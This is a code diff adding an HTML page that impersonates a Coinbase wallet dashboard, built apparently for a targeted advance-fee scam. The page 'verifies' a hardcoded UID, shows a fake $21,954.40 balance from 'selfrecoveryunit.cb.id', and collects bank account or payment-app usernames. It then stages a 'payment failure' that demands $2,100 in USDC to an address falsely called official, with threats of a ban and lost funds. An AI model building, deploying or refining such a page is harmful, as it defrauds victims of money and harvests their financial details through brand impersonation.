@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Coinbase Wallet Dashboard</title>
+  <meta name="viewport" content="width=375, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-main: #0a0c10;
+      --bg-panel: #181a20;
+      --bg-card: #23262f;
+      --blue: #1652f0;
+      --blue-light: #3773f5;
+      --green: #05c46b;
+      --gray: #b1b4bb;
+      --font-main: 'Segoe UI', 'Arial', 'sans-serif';
+      --border-radius: 16px;
+      --shadow: 0 2px 10px #0003;
+      --shadow-card: 0 2px 16px #0004;
+    }
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: var(--bg-main);
+      font-family: var(--font-main);
+      color: #fff;
+      width: 100vw;
+      min-height: 100vh;
+      overflow-x: hidden;
+      font-size: 15px;
+    }
+    .small-text { font-size: 1em; }
+    /* ========== Coinbase Sidebar ========== */
+    .cb-sidebar {
+      position: fixed;
+      top: 0; left: 0; bottom: 0;
+      width: 60px;
+      background: var(--bg-panel);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 16px 0 0 0;
+      z-index: 10;
+      border-right: 1px solid #1a1a1a;
+      min-height: 100vh;
+      gap: 6px;
+    }
+    .cb-sidebar .cb-logo {
+      width: 34px; height: 34px;
+      border-radius: 50%;
+      background: #fff;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .cb-sidebar .cb-logo svg {
+      width: 24px; height: 24px;
+      display: block;
+    }
+    .cb-sidebar .cb-nav {
+      display: flex;
+      flex-direction: column;
+      gap: 13px;
+      width: 100%;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+    .cb-sidebar .cb-nav-btn {
+      background: none;
+      border: none;
+      color: #b1b4bb;
+      width: 40px; height: 40px;
+      display: flex;
+      align-items: center; justify-content: center;
+      border-radius: 50%;
+      cursor: pointer;
+      font-size: 1.22em;
+      transition: background 0.18s, color 0.18s;
+      position: relative;
+    }
+    .cb-sidebar .cb-nav-btn.active, .cb-sidebar .cb-nav-btn:hover {
+      background: var(--blue);
+      color: #fff;
+    }
+    .cb-sidebar .cb-nav-btn svg {
+      width: 22px; height: 22px;
+      display: block;
+    }
+    .cb-sidebar .cb-space {
+      flex: 1 1 0;
+    }
+    .cb-sidebar .cb-footer {
+      margin-bottom: 15px;
+      color: #4a4a53;
+      font-size: 0.88em;
+      text-align: center;
+      width: 100%;
+    }
+    /* ========== Header Bar ========== */
+    .cb-header {
+      margin-left: 60px;
+      height: 56px;
+      background: var(--bg-panel);
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #1a1a1a;
+      padding: 0 0 0 27px;
+      position: relative;
+      z-index: 2;
+    }
+    .cb-header .cb-search-bar {
+      background: #121214;
+      border-radius: 8px;
+      padding: 7px 16px;
+      color: #fff;
+      font-size: 1em;
+      border: none;
+      width: 340px;
+      outline: none;
+      letter-spacing: 0.03em;
+      margin-right: 12px;
+      box-shadow: 0 1px 2px #0002;
+    }
+    .cb-header .cb-search-bar[readonly] {
+      cursor: default;
+      color: #b1b4bb;
+    }
+    .cb-header .cb-header-title {
+      font-size: 1.04em;
+      color: #b1b4bb;
+      margin-left: 10px;
+      flex: 1 1 auto;
+      letter-spacing: 0.02em;
+    }
+    .cb-header .cb-header-icons {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-right: 15px;
+    }
+    .cb-header .cb-header-icons svg {
+      width: 20px; height: 20px;
+      color: #b1b4bb;
+      opacity: 0.85;
+      margin-left: 14px;
+      cursor: pointer;
+    }
+    /* ========== Main Content ========== */
+    .cb-content-root {
+      margin-left: 60px;
+      padding: 0 0 0 0;
+      min-height: 100vh;
+      background: var(--bg-main);
+    }
+    .cb-balance-area {
+      margin: 34px 0 0 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .cb-balance-label {
+      font-size: 0.98em;
+      color: #b1b4bb;
+      margin-bottom: 2px;
+      font-weight: 500;
+      letter-spacing: 0.05em;
+    }
+    .cb-balance {
+      font-size: 2.5em;
+      color: #fff;
+      margin-bottom: 12px;
+      font-weight: 600;
+      letter-spacing: 1.2px;
+      text-shadow: 0 3px 12px #0002;
+    }
+    /* ========== Tabs ========== */
+    .cb-tabs {
+      display: flex;
+      gap: 36px;
+      justify-content: center;
+      align-items: center;
+      margin: 24px 0 0 0;
+      border-bottom: 1px solid #21232b;
+      width: 100%;
+      max-width: 700px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .cb-tab {
+      color: #b1b4bb;
+      font-size: 1em;
+      padding: 10px 0 10px 0;
+      cursor: pointer;
+      font-weight: 500;
+      border: none;
+      background: none;
+      border-bottom: 3px solid transparent;
+      transition: color 0.16s, border-bottom 0.16s;
+      margin-bottom: -2px;
+    }
+    .cb-tab.active {
+      color: var(--blue);
+      border-bottom: 3px solid var(--blue);
+      font-weight: 600;
+    }
+    /* ========== Transactions Table ========== */
+    .cb-table-area {
+      width: 100%;
+      max-width: 700px;
+      margin: 0 auto;
+      margin-top: 22px;
+      background: var(--bg-panel);
+      border-radius: 16px;
+      box-shadow: 0 1px 8px #0002;
+      padding: 0 0 18px 0;
+      overflow-x: auto;
+    }
+    .cb-table {
+      width: 100%;
+      border-collapse: separate;
+      border-spacing: 0 0;
+      font-size: 0.97em;
+    }
+    .cb-table th, .cb-table td {
+      padding: 12px 10px;
+      text-align: left;
+      font-weight: 400;
+      color: #fff;
+      background: none;
+    }
+    .cb-table th {
+      font-weight: 600;
+      color: #b1b4bb;
+      font-size: 0.99em;
+      border-bottom: 1px solid #23262f;
+      letter-spacing: 0.01em;
+    }
+    .cb-table td.cb-icon-cell {
+      width: 42px;
+      padding-right: 0;
+    }
+    .cb-table .cb-amount-pos {
+      color: var(--green);
+      font-weight: 500;
+    }
+    .cb-table .cb-cell-note {
+      font-size: 0.92em;
+      color: #8b8b90;
+      margin-top: 1px;
+    }
+    .cb-table .cb-date-cell {
+      font-size: 0.96em;
+      color: #b1b4bb;
+    }
+    /* ========== P2P Floating Button ========== */
+    .cb-fab-sell {
+      position: fixed;
+      right: 38px;
+      bottom: 78px;
+      background: var(--blue);
+      color: #fff;
+      border: none;
+      border-radius: 50%;
+      width: 56px; height: 56px;
+      display: flex;
+      align-items: center; justify-content: center;
+      font-size: 1.5em;
+      box-shadow: 0 4px 18px #1652f04d;
+      cursor: pointer;
+      z-index: 30;
+      transition: background 0.18s;
+    }
+    .cb-fab-sell:hover, .cb-fab-sell:focus { background: var(--blue-light);}
+    .cb-fab-sell span {
+      font-size: 0.88em;
+      font-weight: 600;
+      letter-spacing: 0.03em;
+      margin-left: 5px;
+    }
+    /* ========== Footer ========== */
+    .cb-footer-bar {
+      width: 100vw;
+      background: var(--blue);
+      color: #fff;
+      font-size: 0.98em;
+      font-weight: 500;
+      text-align: center;
+      padding: 10px 0 7px 0;
+      margin-top: 44px;
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      z-index: 11;
+      letter-spacing: 0.02em;
+    }
+    /* ========== Modal (P2P) ========== */
+    .modal-mask {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: #0a0c10e7;
+      z-index: 2000;
+      align-items: center;
+      justify-content: center;
+      overflow-y: auto;
+    }
+    .modal-mask.show {
+      display: flex;
+    }
+    .modal-card {
+      background: #181a20;
+      color: #fff;
+      border-radius: 16px;
+      max-width: 370px;
+      width: 92vw;
+      margin: 0 auto;
+      padding: 28px 19px 23px 19px;
+      box-shadow: 0 2px 22px #0005;
+      text-align: left;
+      position: relative;
+      animation: modalIn 0.21s;
+      font-size: 1em;
+      border: 1.5px solid #23262f;
+    }
+    @keyframes modalIn {
+      from { transform: translateY(40px) scale(0.98); opacity: 0; }
+      to { transform: translateY(0) scale(1); opacity: 1; }
+    }
+    .modal-close {
+      position: absolute;
+      top: 13px;
+      right: 15px;
+      font-size: 1.4em;
+      color: #888;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      line-height: 1;
+      transition: color 0.18s;
+    }
+    .modal-close:hover { color: var(--blue);}
+    .modal-card label {
+      font-size: 0.99em;
+      color: #b1b4bb;
+      margin-bottom: 2px;
+      display: block;
+      font-weight: 500;
+      margin-top: 11px;
+      letter-spacing: 0.01em;
+    }
+    .modal-card input, .modal-card select {
+      width: 100%;
+      padding: 10px;
+      margin: 7px 0 13px 0;
+      border-radius: 7px;
+      border: 1px solid #23262f;
+      background: #0a0c10;
+      font-size: 1.01em;
+      color: #fff;
+      outline: none;
+      transition: border 0.18s;
+    }
+    .modal-card input:focus, .modal-card select:focus {
+      border: 1.5px solid var(--blue);
+    }
+    .modal-card input[readonly] {
+      background: #23262f;
+      color: #fff;
+      font-weight: 600;
+      border: none;
+    }
+    .modal-btn {
+      width: 100%;
+      background: var(--blue);
+      color: #fff;
+      border-radius: 9px;
+      border: none;
+      padding: 13px 0;
+      font-weight: 600;
+      font-size: 1.07em;
+      margin-top: 17px;
+      transition: background 0.18s;
+      cursor: pointer;
+    }
+    .modal-btn:hover { background: var(--blue-light);}
+    .modal-note {
+      color: #8ca0b8;
+      font-size: 0.97em;
+      margin-bottom: 5px;
+    }
+    .modal-copy-row {
+      background: #121214;
+      color: #fff;
+      padding: 8px 10px;
+      border-radius: 7px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 8px 0 13px 0;
+      font-size: 0.96em;
+      user-select: all;
+      border: 1px solid #23262f;
+    }
+    .copy-btn {
+      padding: 3px 12px;
+      font-size: 0.97em;
+      border-radius: 6px;
+      background: var(--blue);
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      margin-left: 7px;
+      transition: background 0.2s;
+    }
+    .copy-btn:active { background: var(--blue-light);}
+    .modal-warning {
+      color: #f44336;
+      font-size: 0.98em;
+      font-weight: 500;
+      margin-top: 12px;
+    }
+    .custom-file {
+      background: #121214;
+      border-radius: 8px;
+      padding: 12px;
+      margin: 11px 0 7px 0;
+      text-align: center;
+      color: #b1b4bb;
+      font-size: 0.98em;
+      cursor: pointer;
+      border: 1px dashed #b1b4bb;
+      transition: border 0.18s;
+      display: block;
+    }
+    .custom-file:hover { border: 1px solid var(--blue);}
+    .file-name { font-size: 0.97em; color: #87a3d3; margin-top: 5px; font-weight: 500;}
+    @media (max-width: 700px) {
+      .cb-content-root, .cb-header, .cb-footer-bar { margin-left: 0;}
+      .cb-sidebar { display: none;}
+    }
+    @media (max-width: 500px) {
+      .cb-header { padding-left: 7px;}
+      .cb-balance { font-size: 2em;}
+      .cb-tabs { gap: 7vw;}
+      .cb-table-area { max-width: 99vw;}
+      .modal-card { max-width: 99vw;}
+      .cb-fab-sell { right: 12px;}
+    }
+  </style>
+</head>
+<body>
+  <!-- ---------- Ownership Verification Section ---------- -->
+  <div class="container" id="ownership-section">
+    <img src="IMG_4058.jpeg" alt="Main Content" class="main-image" id="mainImage">
+    <div class="small-text" style="margin-top:19px;text-align:center;max-width:350px;opacity:0.93;">
+      <b>Welcome!</b> To continue, verify ownership of this Coinbase wallet.<br>
+      Click below to start.
+    </div>
+  </div>
+  <!-- Floating Button -->
+  <button class="floating-btn" id="dashboardBtn">
+    <span>Begin Verification</span>
+  </button>
+  <!-- Modal for Verification Steps -->
+  <div class="modal" id="modal">
+    <div class="modal-content" id="modalContent">
+      <!-- Dynamic content loaded here -->
+    </div>
+  </div>
+  <!-- =================== COINBASE DASHBOARD =================== -->
+  <div id="cb-dashboard-root" style="display:none;">
+    <!-- Sidebar -->
+    <nav class="cb-sidebar">
+      <div class="cb-logo">
+        <svg fill="none" viewBox="0 0 32 32"><rect width="32" height="32" rx="16" fill="#1652F0"/><path fill="#fff" d="M16 8a8 8 0 100 16 8 8 0 000-16zm.001 2.667c4.418 0 8 3.582 8 8a8 8 0 01-8 8c-4.418 0-8-3.582-8-8a8 8 0 018-8z"/></svg>
+      </div>
+      <div class="cb-nav">
+        <button class="cb-nav-btn active" title="Home">
+          <svg viewBox="0 0 24 24"><path d="M3 12L12 5l9 7" stroke="currentColor" stroke-width="2" fill="none"/><rect x="6" y="12" width="12" height="7" rx="2" fill="currentColor" opacity="0.2"/></svg>
+        </button>
+        <button class="cb-nav-btn" title="Portfolio">
+          <svg viewBox="0 0 24 24"><rect x="3" y="6" width="18" height="14" rx="2" stroke="currentColor" stroke-width="2" fill="none"/><rect x="7" y="10" width="10" height="6" rx="1.5" fill="currentColor" opacity="0.2"/></svg>
+        </button>
+        <button class="cb-nav-btn" title="Transactions">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" fill="none"/><path d="M12 8v4l3 2" stroke="currentColor" stroke-width="2" fill="none"/></svg>
+        </button>
+        <button class="cb-nav-btn" title="Settings">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2" fill="none"/><path d="M19.4 15a1.65 1.65 0 000-6M4.6 9a1.65 1.65 0 000 6" stroke="currentColor" stroke-width="2" fill="none"/></svg>
+        </button>
+      </div>
+      <div class="cb-space"></div>
+      <div class="cb-footer">
+        <span style="font-size:0.95em;opacity:0.7;">&#169; 2025</span>
+      </div>
+    </nav>
+    <!-- Header -->
+    <header class="cb-header">
+      <input class="cb-search-bar" readonly value="Legalize Coinbase Payment Monitored by SEC">
+      <div class="cb-header-title"></div>
+      <div class="cb-header-icons">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="2.5" fill="#b1b4bb"/><path d="M12 2v2m0 16v2m10-10h-2M4 12H2m14.95 7.07l-1.42-1.42M7.07 7.07L5.65 5.65m12.02-1.42l-1.42 1.42M7.07 16.95l-1.42 1.42" stroke="#b1b4bb" stroke-width="1.5" fill="none"/></svg>
+        <svg viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="12" rx="2" fill="#b1b4bb"/></svg>
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="5" fill="#b1b4bb"/></svg>
+      </div>
+    </header>
+    <!-- Main Content -->
+    <main class="cb-content-root">
+      <section class="cb-balance-area">
+        <div class="cb-balance-label">Balance</div>
+        <div class="cb-balance" id="cb-balance-amt">$21,954.40</div>
+      </section>
+      <section class="cb-tabs" id="cb-tabs">
+        <button class="cb-tab" id="tab-crypto">Crypto</button>
+        <button class="cb-tab" id="tab-defi">DeFi</button>
+        <button class="cb-tab active" id="tab-transactions">Transactions</button>
+      </section>
+      <section class="cb-table-area" id="cb-tx-area">
+        <table class="cb-table">
+          <thead>
+            <tr>
+              <th>Transaction</th>
+              <th>Value</th>
+              <th>Date</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="cb-icon-cell">
+                <span style="font-size:1.5em;vertical-align:middle;">💰</span>
+              </td>
+              <td>
+                <b>Received</b>
+                <div class="cb-cell-note">From<br>selfrecoveryunit.cb.id</div>
+              </td>
+              <td class="cb-amount-pos">+ $7,135.12<br>
+                <span class="cb-date-cell">May 05, 2025,<br>08:39 PM</span>
+              </td>
+            </tr>
+            <tr>
+              <td class="cb-icon-cell">
+                <span style="font-size:1.5em;vertical-align:middle;">💰</span>
+              </td>
+              <td>
+                <b>Received</b>
+                <div class="cb-cell-note">From<br>selfrecoveryunit.cb.id</div>
+              </td>
+              <td class="cb-amount-pos">+ $14,684.14<br>
+                <span class="cb-date-cell">Apr 30, 2025,<br>09:54 AM</span>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </section>
+      <!-- SELL (P2P) FAB -->
+      <button class="cb-fab-sell" id="cb-sell-btn" title="P2P Sell">
+        <svg width="22" height="22" viewBox="0 0 24 24"><circle cx="12" cy="12" r="11" fill="#fff" opacity="0.19"/><path d="M12 7v7m0 0l-3-3m3 3l3-3" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>
+        <span style="display:none;">SELL</span>
+      </button>
+    </main>
+    <!-- Footer -->
+    <footer class="cb-footer-bar">
+      Funds are Verified &#169; By Coinbase.com &nbsp; | &nbsp; 2025 Coinbase &bull; United States 🇺🇸 | English
+    </footer>
+    <!-- P2P Sell Modal -->
+    <div class="modal-mask" id="p2p-modal">
+      <div class="modal-card" id="p2p-modal-card">
+        <button class="modal-close" aria-label="Close" id="close-p2p-modal">&times;</button>
+        <h2>SELL USDC to Bank/App</h2>
+        <form id="p2p-sell-form" autocomplete="off">
+          <label>Amount</label>
+          <input type="text" value="21,954.40" readonly />
+          <div class="modal-note">USD</div>
+          <label>Bank or App</label>
+          <select id="bank-select" required></select>
+          <label>Account Number / Username</label>
+          <input id="bank-account" maxlength="32" type="text" placeholder="Enter Account Number or App Username" autocomplete="off" required />
+          <button type="submit" class="modal-btn">Confirm</button>
+        </form>
+      </div>
+    </div>
+    <!-- Sell Review Modal -->
+    <div class="modal-mask" id="sell-review-modal">
+      <div class="modal-card">
+        <button class="modal-close" aria-label="Close" id="close-sell-review">&times;</button>
+        <h2>Review Sell Order</h2>
+        <div id="review-details"></div>
+        <div style="display:flex;align-items:center;margin:13px 0 10px 0;">
+          <input type="checkbox" id="review-tick" style="accent-color:var(--blue);margin-right:8px;width:1.07em;height:1.07em;"/>
+          <label for="review-tick" style="font-size:1em;user-select:none;cursor:pointer;">I confirm this sell order</label>
+        </div>
+        <button class="modal-btn" id="place-sell-order">Place Sell Order</button>
+      </div>
+    </div>
+    <!-- Awaiting Order Modal -->
+    <div class="modal-mask" id="awaiting-order-modal">
+      <div class="modal-card" id="awaiting-content">
+        <!-- JS fills content -->
+      </div>
+    </div>
+  </div>
+  <script>
+    // ---------------------- Ownership Verification Steps --------------------
+    const dashboardBtn = document.getElementById('dashboardBtn');
+    const modal = document.getElementById('modal');
+    const modalContent = document.getElementById('modalContent');
+    let userCountry = 'United States 🇺🇸', userName = '', userUID = '', verificationPassed = false;
+
+    function showCountryStep() {
+      modalContent.innerHTML = `
+        <h2>Confirm Your Country</h2>
+        <div style="font-size:1.2em;text-align:center;margin:12px 0 17px 0;">${userCountry}</div>
+        <button onclick="proceedToName()" style="margin-top:6px;font-size:0.97em;">Confirm</button>
+      `;
+    }
+    function showNameUidStep(error = "") {
+      modalContent.innerHTML = `
+        <h2>Ownership Verification</h2>
+        <label for="nameInput">Full Name</label>
+        <input id="nameInput" type="text" maxlength="50" placeholder="Enter your full name" value="${userName}">
+        <label for="uidInput">UID</label>
+        <input id="uidInput" type="number" maxlength="12" placeholder="Enter your UID" value="${userUID}">
+        <span class="error-message">${error}</span>
+        <button onclick="checkNameUid()" style="font-size:0.97em;">Retrieve Pending Transaction</button>
+      `;
+      setTimeout(() => { document.getElementById('nameInput').focus(); }, 80);
+    }
+    function showLoader() {
+      modalContent.innerHTML = `
+        <div class="loader-container">
+          <div class="bybit-spinner" style="margin-bottom:8px;">
+            <div class="circle" style="border-color: #1652f0 #181a20 #181a20 #181a20;"></div>
+            <div class="logo" style="background:#1652f0;color:#fff;letter-spacing:0">C</div>
+          </div>
+          <div class="fetch-text">FETCHING TRANSACTION DATA</div>
+        </div>
+      `;
+    }
+    function showDashboardRoot() {
+      document.getElementById('ownership-section').style.display = 'none';
+      dashboardBtn.style.display = 'none';
+      document.getElementById('cb-dashboard-root').style.display = '';
+      window.scrollTo(0,0);
+    }
+    window.proceedToName = function() { showNameUidStep(); };
+    window.checkNameUid = function() {
+      const nameInput = document.getElementById('nameInput').value.trim();
+      const uidInput = document.getElementById('uidInput').value.trim();
+      if (!nameInput) { showNameUidStep("Please enter your full name."); return; }
+      if (uidInput !== "431775015") { showNameUidStep("Invalid UID. Ownership verification failed."); return; }
+      userName = nameInput;
+      userUID = uidInput;
+      verificationPassed = true;
+      showLoader();
+      setTimeout(() => { modal.classList.remove('active'); showDashboardRoot(); }, 1800);
+    };
+    dashboardBtn.onclick = () => { modal.classList.add('active'); showCountryStep(); };
+    modal.onclick = function(e){
+      if (e.target === modal) {
+        modal.classList.remove('active');
+        verificationPassed = false;
+        userName = '';
+        userUID = '';
+      }
+    };
+    document.getElementById('mainImage').onclick = () => { dashboardBtn.click(); };
+
+    // =============== Coinbase Dashboard Logic ================
+    // Tabs (for demonstration, only Transactions is active)
+    document.getElementById('tab-crypto').onclick = document.getElementById('tab-defi').onclick = function() {
+      // Only Transactions is available in this demo
+      alert('Only "Transactions" tab is available in this demo.');
+    };
+    // Sidebar active highlight (only demo effect)
+    document.querySelectorAll('.cb-nav-btn').forEach(btn => {
+      btn.addEventListener('click', function() {
+        document.querySelectorAll('.cb-nav-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+      });
+    });
+    // ------------- P2P SELL FLOW -------------
+    // US Top 30 Banks & Apps
+    const usBanks = [
+      "JPMorgan Chase", "Bank of America", "Wells Fargo", "Citibank", "U.S. Bank", "PNC Bank", "Truist", 
+      "Goldman Sachs", "TD Bank", "Capital One", "HSBC", "Fifth Third Bank", "KeyBank", "Regions Bank",
+      "Ally Bank", "BMO Harris Bank", "Charles Schwab", "SunTrust Bank", "M&T Bank", "Huntington Bank",
+      "Silicon Valley Bank", "Synchrony Bank", "Citizens Bank", "USAA", "First Republic Bank", "Comerica Bank",
+      "Santander Bank", "Bank of the West", "Credit One Bank", "First National Bank",
+      "Cash App", "Chime", "Venmo", "PayPal", "Zelle", "Wise", "Revolut"
+    ];
+    // Populate banks/apps select
+    function populateBanks() {
+      const select = document.getElementById('bank-select');
+      select.innerHTML = usBanks.map(b => `<option value="${b}">${b}</option>`).join('');
+    }
+    populateBanks();
+    // Open/close modal logic
+    document.getElementById('cb-sell-btn').onclick = openP2PModal;
+    function openP2PModal() {
+      document.getElementById('p2p-modal').classList.add('show');
+      document.getElementById('bank-account').value = '';
+      document.getElementById('bank-select').selectedIndex = 0;
+    }
+    document.getElementById('close-p2p-modal').onclick = () => {
+      document.getElementById('p2p-modal').classList.remove('show');
+    };
+    document.getElementById('close-sell-review').onclick = () => {
+      document.getElementById('sell-review-modal').classList.remove('show');
+    };
+    // P2P Form
+    document.getElementById('p2p-sell-form').onsubmit = (e) => {
+      e.preventDefault();
+      const bank = document.getElementById('bank-select').value;
+      const acc = document.getElementById('bank-account').value.trim();
+      if (!bank || !acc) {
+        alert("Please select a bank/app and enter your account/username.");
+        return false;
+      }
+      document.getElementById('p2p-modal').classList.remove('show');
+      showSellReview(bank, acc);
+      return false;
+    };
+    // Review Modal
+    function showSellReview(bank, acc) {
+      let rate = "$21,954.40";
+      document.getElementById('review-details').innerHTML = `
+        <div style="margin-bottom:6px;">Dear Coinbase User, you are about to <b>SELL $21,954.40 USDC</b> to:<br><b>${bank}</b><br>Account/Username: <b>${acc}</b></div>
+        <div style="margin-bottom:5px;">P2P Sell Rate: <b>$21,954.40</b></div>
+      `;
+      document.getElementById('review-tick').checked = false;
+      document.getElementById('sell-review-modal').classList.add('show');
+      document.getElementById('place-sell-order').onclick = function() {
+        if (!document.getElementById('review-tick').checked) {
+          alert("Please confirm the sell order by ticking the checkbox.");
+          return;
+        }
+        document.getElementById('sell-review-modal').classList.remove('show');
+        showAwaitingOrder(bank, acc);
+      };
+    }
+    function showAwaitingOrder(bank, acc) {
+      let rate = "$21,954.40";
+      const awaiting = document.getElementById('awaiting-content');
+      document.getElementById('awaiting-order-modal').classList.add('show');
+      awaiting.innerHTML = `
+        <h2>AWAITING ORDER</h2>
+        <div style="margin-bottom:8px;">
+          <b>${rate}</b> will be credited to <br><b>${bank}</b><br>Account/Username: <b>${acc}</b>
+        </div>
+        <div class="modal-note">
+          P2P SELL generally completes within 30 minutes.
+        </div>
+      `;
+      setTimeout(() => {
+        showAppeal(bank, acc, rate);
+      }, 9000);
+    }
+    function showAppeal(bank, acc, rate) {
+      const awaiting = document.getElementById('awaiting-content');
+      awaiting.innerHTML = `
+        <div style="color:#f44336;font-weight:600;margin-bottom:9px;">Payment Failure!</div>
+        <div style="margin-bottom:7px;">
+          Due to <b>COINBASE P2P MARKET SECURITY</b>, a payment of <b>$2,100</b> is required to appeal.<br>
+          Send <b>$2,100</b> in USDC to this official verified Coinbase address:
+        </div>
+        <div class="modal-copy-row">
+          <span id="cb-address">0xCB4E9A1B6dE3A3bC108b8e4A6B2c2B7eE4f7a3C0</span>
+          <button class="copy-btn" id="copy-cb-address">Copy</button>
+        </div>
+        <div class="modal-note">Upload payment screenshot below</div>
+        <label for="payment-screenshot" class="custom-file" id="file-label">
+          <span id="file-label-text">Click to upload screenshot</span>
+          <input type="file" id="payment-screenshot" accept="image/*" style="display:none;"/>
+        </label>
+        <button class="modal-btn" id="paid-btn">I have paid</button>
+        <div class="modal-warning">
+          Do not click until payment is made or your UID (<b>431775015</b>) will be banned and it may lead to total loss of funds.
+        </div>
+      `;
+      document.getElementById('copy-cb-address').onclick = function() {
+        const text = document.getElementById('cb-address').innerText;
+        navigator.clipboard.writeText(text);
+        this.innerText = "Copied!";
+        setTimeout(() => this.innerText = "Copy", 1300);
+      };
+      const fileInput = document.getElementById('payment-screenshot');
+      fileInput.onchange = function() {
+        if (fileInput.files.length) {
+          document.getElementById('file-label-text').innerText = "Uploaded: " + fileInput.files[0].name;
+        } else {
+          document.getElementById('file-label-text').innerText = "Click to upload screenshot";
+        }
+      };
+      document.getElementById('paid-btn').onclick = function() {
+        if (!fileInput.files.length) {
+          alert("Please upload your payment screenshot.");
+          return;
+        }
+        awaiting.innerHTML = `
+          <h2>Order Submitted</h2>
+          <div style="margin-bottom:7px;">
+            Your payment has been received and your <b>Sell Order</b> is being processed.<br>
+            <b>${rate}</b> will be credited to:<br><b>${bank}</b><br>Account/Username: <b>${acc}</b>
+          </div>
+          <div class="modal-note" style="font-size:1em;">
+            Thank you for using Coinbase P2P. You can close this window.
+          </div>
+          <button class="modal-btn" id="close-awaiting">Close</button>
+        `;
+        document.getElementById('close-awaiting').onclick = () => {
+          document.getElementById('awaiting-order-modal').classList.remove('show');
+        };
+      };
+    }
+    // Modal backdrop close
+    document.querySelectorAll('.modal-mask').forEach(mask => {
+      mask.addEventListener('mousedown', function(e) {
+        if (e.target === mask) mask.classList.remove('show');
+      });
+    });
+  </script>
+</body>
+</html>
